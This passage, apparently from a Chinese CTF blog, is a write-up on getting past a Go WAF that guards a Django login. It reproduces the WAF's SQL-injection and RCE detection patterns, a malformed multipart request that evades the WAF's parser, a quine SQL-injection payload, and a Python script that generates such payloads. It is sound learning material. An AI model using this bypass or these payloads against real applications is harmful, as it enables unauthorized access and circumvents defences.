class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> backendURL = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><span class="hljs-keyword">const</span> backendHost = <span class="hljs-string">&quot;127.0.0.1:8000&quot;</span><br><br><span class="hljs-keyword">var</span> blockedIPs = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>&#123;<br><span class="hljs-string">&quot;1.1.1.1&quot;</span>: <span class="hljs-literal">true</span>,<br>&#125;<br><br><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="hljs-string">`(?i)(select)`</span>)<br><br><span class="hljs-keyword">var</span> blockedUserAgents = []<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;sqlmap&quot;</span>,<br><span class="hljs-string">&quot;nmap&quot;</span>,<br><span class="hljs-string">&quot;curl&quot;</span>,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedIP</span><span class="hljs-params">(ip <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> blockedIPs[ip]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isMaliciousRequest</span><span class="hljs-params">(r *http.Request)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.URL.Query() &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> r.Method == http.MethodPost &#123;<br>ct := r.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>mediaType, _, err := mime.ParseMediaType(ct)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> mediaType == <span class="hljs-string">&quot;multipart/form-data&quot;</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseMultipartForm(<span class="hljs-number">65535</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseForm(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.PostForm &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%v&quot;</span>, key, values)<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedUserAgent</span><span class="hljs-params">(userAgent <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, blocked := <span class="hljs-keyword">range</span> blockedUserAgents &#123;<br><span class="hljs-keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">reverseProxyHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>clientIP := r.RemoteAddr<br><span class="hljs-keyword">if</span> isBlockedIP(clientIP) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 IP: %s&quot;</span>, clientIP)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>bodyBytes, err := io.ReadAll(r.Body)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))<br><br><span class="hljs-keyword">if</span> isMaliciousRequest(r) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 User-Agent: %s&quot;</span>, r.UserAgent())<br><span class="hljs-keyword">return</span><br>&#125;<br><br>proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br>proxyReq.Header = r.Header<br><br>client := &amp;http.Client&#123;<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;,<br>&#125;<br><br>resp, err := client.Do(proxyReq)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> resp.Header &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;Location&quot;</span> &#123;<br>value = strings.Replace(value, backendHost, r.Host, <span class="hljs-number">-1</span>)<br>&#125;<br>w.Header().Add(key, value)<br>&#125;<br>&#125;<br>w.WriteHeader(resp.StatusCode)<br>io.Copy(w, resp.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, reverseProxyHandler)<br>log.Println(<span class="hljs-string">&quot;Listen on 0.0.0.0:8080&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:8080&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>（感觉这个waf挺好，以后的可以利用一下）  </p><p>可以看到过滤的部分：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">var sqlInjectionPattern = regexp.<span class="hljs-title class_">MustCompile</span>(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|<span class="hljs-comment">#|\*\/|\/\*)`)</span><br><br>var rcePattern = regexp.<span class="hljs-title class_">MustCompile</span>(`(?i)(\b(?<span class="hljs-symbol">:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert</span>)\s*\(.+\))`)<br></code></pre></td></tr></table></figure><p>这个绕不过，，，  </p><p>上网查wp，看到好像都是用http请求来绕过waf  </p><p>源码点：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br></code></pre></td></tr></table></figure><p>因为waf检测Content-Type的源码为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.Method == http.MethodPost &#123;<br>    ct := r.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>    mediaType, _, err := mime.ParseMediaType(ct)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> <br>    &#125;<br>    <span class="hljs-keyword">if</span> mediaType == <span class="hljs-string">&quot;multipart/form-data&quot;</span> &#123;<br>        r.ParseMultipartForm(...)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        r.ParseForm() <span class="hljs-comment">// 只解析 application/x-www-form-urlencoded</span><br>    &#125;<br><br>    <span class="hljs-comment">// 然后只检查 r.PostForm</span><br>    <span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.PostForm &#123; ... &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ParseForm 不会解析以下内容：</p><p>multipart 表单（multipart&#x2F;form-data）：比如包含文件上传的表单。</p><p>要解析这类表单，必须使用 r.ParseMultipartForm(maxMemory)。<br>JSON、XML 或其他非表单格式的请求体：这些需要手动读取 r.Body 并用相应解码器（如 json.Decoder）处理。</p><p>而 Django 的 request.POST 只在以下情况有数据：</p><p>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Type: multipart&#x2F;form-data</p><p>源码：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br></code></pre></td></tr></table></figure><p>所以要绕过waf的检测，请求类型就得是application&#x2F;x-www-form-urlencoded以外的，<br>而在request.POST里只除了该请求就只能处理Content-Type: multipart&#x2F;form-data<br>所以我们只能选择multipart&#x2F;form-data来绕过  </p><p>改出了以下请求报头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.75.100:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryxYzAbc123<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>255<br><br><span class="language-haskell"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;username&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell"><span class="hljs-title">admin</span></span><br><span class="language-haskell"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>;</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;password&quot;;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell"><span class="hljs-number">1</span>&#x27;#--</span><br><span class="language-haskell"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123--</span></span><br></code></pre></td></tr></table></figure><p>这个请求头就绕过了waf的检测，只返回了password wrong  </p><p>我个人推测：<br>multipart 格式故意构造错误（重复 Content-Disposition），导致 Go 的 WAF 无法正确解析出 password 字段；<br>因此，恶意 payload 未进入 r.PostForm，WAF 的正则检查完全没触发；</p><p>那接下来是要去绕过sql，<br>看源码，要求输入的password和查询的结果是一样的，<br>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pythom">try:<br>    assert password == users[0].password<br>    return HttpResponse(os.environ.get(&#x27;FLAG&#x27;))<br></code></pre></td></tr></table></figure><p>就是你输入的语句&#x3D;&#x3D;与查询的真实密码，才会有flag。  </p><h4 id="这里学习到了新的知识，quine注入，这种注入能使得数据库返回的数据与用户输入的sql注入语句一致。"><a href="#这里学习到了新的知识，quine注入，这种注入能使得数据库返回的数据与用户输入的sql注入语句一致。" class="headerlink" title="这里学习到了新的知识，quine注入，这种注入能使得数据库返回的数据与用户输入的sql注入语句一致。"></a><strong>这里学习到了新的知识，quine注入，这种注入能使得数据库返回的数据与用户输入的sql注入语句一致。</strong></h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stata">我们按循序执行：<br><span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(&#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;,<br>                <span class="hljs-built_in">CHAR</span>(34),<br>                <span class="hljs-built_in">CHAR</span>(39))<br>                ,<span class="hljs-built_in">CHAR</span>(46),<br>                &#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;)<br><br>内层变为<br><span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(&#x27;.&#x27;,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),&#x27;.&#x27;)<br><br>这时外层再把 . 替换为：<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)<br><br>得到：<br><span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(&#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),&#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;)<br><br>这时候对比原来：<br><span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(&#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),&#x27;<span class="hljs-keyword">REPLACE</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-built_in">CHAR</span>(34),<span class="hljs-built_in">CHAR</span>(39)),<span class="hljs-built_in">CHAR</span>(46),<span class="hljs-string">&quot;.&quot;</span>)&#x27;)<br><br>发现输出是与输入一样的。<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.75.100:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryxYzAbc123<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>473<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;username&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">admin</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123</span></span><br><span class="language-pgsql">Content-Disposition: form-data;</span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;password&quot;;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,replace(replace(&#x27;</span><span class="hljs-number">1</span>&quot; union select 1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;,char(34),char(39)),char(46),&#x27;1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,replace(replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)<span class="hljs-comment">-- &#x27;)-- </span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryxYzAbc123--</span></span><br></code></pre></td></tr></table></figure><p>然后也算拿到了一个脚本用来构造quine:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">sql = <span class="hljs-built_in">input</span> (<span class="hljs-string">&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#x27;union select #\n&quot;</span>)<br>sql2 = sql.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>base = <span class="hljs-string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span><br>final = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> string):<br>        tem = string.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> string):<br>        tem = string.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">return</span> tem<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">string,sql</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> string):<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + string + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> string):<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + string + <span class="hljs-string">&quot;#&quot;</span><br><br>res = patch(base.replace(<span class="hljs-string">&quot;.&quot;</span>,add(sql2)),sql).replace(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;.&quot;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-comment">#构造这一题：1&#x27;union select 1,2--+</span><br><br><span class="hljs-comment"># base = replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)</span><br><span class="hljs-comment"># sql=1&#x27;union select 1,2,--+</span><br><span class="hljs-comment"># sql2 =1&quot;union select 1,2,--+</span><br><br><span class="hljs-comment"># add(sql2)=1&quot;union select 1,2,replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)--+</span><br><br><span class="hljs-comment"># 1&#x27;union select 1,2,replace(replace(&#x27;1&quot;union select 1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)--+&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union select 1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)--+&#x27;)--+</span><br></code></pre></td></tr></table></figure><p>自己尝试跟着构造了一遍，看是能看懂了，但是估计真到自己做的时候是构造不出来的。。。  </p><p>学习了下面师傅的wp：<br><a href="https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/#title-19">https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/#title-19</a><br><a href="https://xz.aliyun.com/news/17519">https://xz.aliyun.com/news/17519</a><br><a href="https://xz.aliyun.com/news/17210">https://xz.aliyun.com/news/17210</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线下赛</title>
    <link href="/2025/10/18/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
